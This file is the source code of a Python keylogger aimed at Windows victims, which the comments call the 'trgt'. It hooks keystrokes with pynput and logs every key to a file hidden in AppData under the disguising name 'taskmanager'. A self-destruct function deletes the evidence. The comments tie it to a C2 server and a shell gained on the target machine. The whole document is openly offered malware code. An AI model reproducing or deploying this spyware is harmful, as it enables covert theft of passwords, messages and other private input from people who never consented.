#!/usr/bin/python3


import os                                    # library can be used to change directory by the C2 server owner, after getting a shell back from trgt
from pynput.keyboard import Listener, Key

import time
import threading                             # used to run multiple threads (tasks, function calls) at the same time


class Win_Keylogger():

	keys = []
	counter = 0

	flag = 0                                              # when: flag = 0 ==>  keylogger will run
							      # when: flag = 1 ==>  keylogger will stop and the file where keys are logged, gets self destructed

	# If trgt os is win
	if os.name == 'nt':                                   # Mentioned to avoid intial scanning done by python interpreter as if the trgt machine is linux, then code will through an error

		# Creates a new file
		win_path = os.environ['appdata'] + '\\taskmanager'

		with open(win_path, 'w') as fp:
			pass

		# For Windows, we can hide the file in the appdata directory -> C:\Users\<usernme>\AppData\Roaming\\taskmanager


		def on_press(self, key):

			self.keys.append(key)
			self.counter += 1

			if self.counter >= 1:

				self.counter = 0
				self.write_file(self.keys)
				self.keys = []                             # So that each doesn't get printed repeatedly


		def read_logs(self):

			with open(self.win_path, 'rt') as f:              # Reading file as text

				return f.read()

		# Kelogger captured key pattern
		def write_file(self, keys):
			with open(self.win_path, 'a') as file:
				for key in keys:
					k = str(key).replace("'", "")     # To avoid: 'U''D''P' -> Instead: UDP
					# Backspace Key

					if k.find('backspace') > 0:
						file.write(' <Backspace> ')

					# Enter Key

					elif k.find('enter') > 0:
						file.write('\n')

					# Shift key

					elif k.find('shift_r') > 0:
						file.write(' <R_shift> ')     # space is used in front and end :
		                                                              # To avoid this -> I would tell you a<R_Shift>UDP joke but
		                                                              #                  you might not get it
		                                                              # Instead, we will get -> I would tell you a <R_Shift> UDP joke but
		                                                              #                         you might not get it
					elif k.find('shift') > 0:
						file.write(' <L_shift> ')

					# Alt Key

					elif k.find('alt_gr') > 0:
						file.write('\n <altgr> ')
					elif k.find('alt_r') > 0:
						file.write('\n <R_alt> ')
					elif k.find('alt') > 0:
						file.write('\n <L_alt ')

					# Super Key

					elif k.find('cmd_r') > 0:
						file.write('\n Pressed [right] Super Key ')
					elif k.find('cmd') > 0:
						file.write('\n Pressed [left] Super Key ')

					# Delete key

					elif k.find('delete') > 0:
						file.write(' <delete> ')
						# add number of delete with characters

					# Home, End, page Up/Down

					elif k.find('page_up') > 0:
						file.write(' <pg up> ')
					elif k.find('page_down') > 0:
						file.write(' <pg dn> ')
					elif k.find('home') > 0:
						file.write(' <home> ')
					elif k.find('end') > 0:
						file.write(' <end> ')

					# Arrow Keys

					elif k.find('left') > 0:
						file.write(' [<- key] ')
					elif k.find('right') > 0:
						file.write(' [-> key] ')
					elif k.find('up') > 0:
						file.write(' [up_arrow_key] ')
					elif k.find('down') > 0:
						file.write(' [down_arrow_key] ')

					# Space Key

					elif k.find('space') > 0:
						file.write(' ')

					# Capslock

					elif k.find('caps_lock') > 0:
						file.write(' <caps_lock> ')

					# Tab

					elif k.find('tab') > 0:
						file.write(' <tab> ')

					# Esc key

					elif k.find('esc') > 0:
						file.write(' <esc key> ')

					# Print Screen

					elif k.find('print_screen') > 0:
						file.write(' <prnt scrn> ')

					# Ctrl

					elif k.find('ctrl_r') > 0:
						file.write(' <R_ctrl> ')

					elif k.find('ctrl') > 0:
						file.write(' <L_ctrl> ')


					# Media keys

					elif k.find('media_Play_pause')  > 0:
						file.write('\n [media_play_pause/>|| key] ')
						# Add sound capture
					elif k.find('media_next') > 0:
						file.write('\n [media_next/>>| key] ')
					elif k.find('media_previous') > 0:
						file.write('\n [media_previous/|<< key] ')


					# Media Volumn lvl

					elif k.find('media_volume_up') > 0:
						file.write('\n [Volumn up] ')
					elif k.find('media_volume_down') > 0:
						file.write('\n [Volumn down] ')
					elif k.find('media_volume_mute') > 0:
						file.write('\n [Volumn mute] ')

					# num_lock

					elif k.find('num_lock') > 0:
						file.write('\n <num_lock> ')

					# insert key

					elif k.find('insert') > 0:
						file.write('\n <insert> ')

					# Scroll lock

					elif k.find('scroll_lock') > 0:
						file.write('\n <scroll lock> ')

					# f1-20 keys

					elif k.find('f1') > 0:
						file.write('\n <f1> ')
					elif k.find('f2') > 0:
			                	file.write('\n <f2> ')
					elif k.find('f3') > 0:
				                file.write('\n <f3> ')
					elif k.find('f4') > 0:
			        	        file.write('\n <f4> ')
					elif k.find('f5') > 0:
				                file.write('\n <f5> ')
					elif k.find('f6') > 0:
			        	        file.write('\n <f6> ')
					elif k.find('f7') > 0:
				                file.write('\n <f7> ')
					elif k.find('f8') > 0:
			        	        file.write('\n <f8> ')
					elif k.find('f9') > 0:
				                file.write('\n <f9> ')
					elif k.find('f10') > 0:
			        	        file.write('\n <f10> ')
					elif k.find('f11') > 0:
				                file.write('\n <f11> ')
					elif k.find('f12') > 0:
			        	        file.write('\n <f12> ')
					elif k.find('f13') > 0:
				                file.write('\n <f13> ')
					elif k.find('f14') > 0:
			        	        file.write('\n <f14> ')
					elif k.find('f15') > 0:
				                file.write('\n <f15> ')
					elif k.find('f16') > 0:
			        	        file.write('\n <f16> ')
					elif k.find('f17') > 0:
				                file.write('\n <f17> ')
					elif k.find('f18') > 0:
			        	        file.write('\n <f18> ')
					elif k.find('f19') > 0:
				                file.write('\n <f19> ')
					elif k.find('f20') > 0:
			        	        file.write('\n <f20> ')


					# Any other key

					elif k.find('Key'):
						file.write(k)


	def keylog_start(self):

		global listener
		with Listener(on_press=self.on_press) as listener:  # Starting Keylogger
			listener.join()



	def keylog_off_self_destruct(self):

		self.flag = 1
		listener.stop()                               # Stops storing keystrokes
		os.remove(self.win_path)		      # Removing the file


if __name__ == "__main__":

	keylog = Win_Keylogger()

	t = threading.Thread(target=keylog.keylog_start)
	t.start()

	while keylog.flag == 0:

		time.sleep(10)
		logs = keylog.read_logs()                   # Dumping Keys
		print(logs)                                 # from file

		keylog.keylog_off_self_destruct()

	t.join()

 
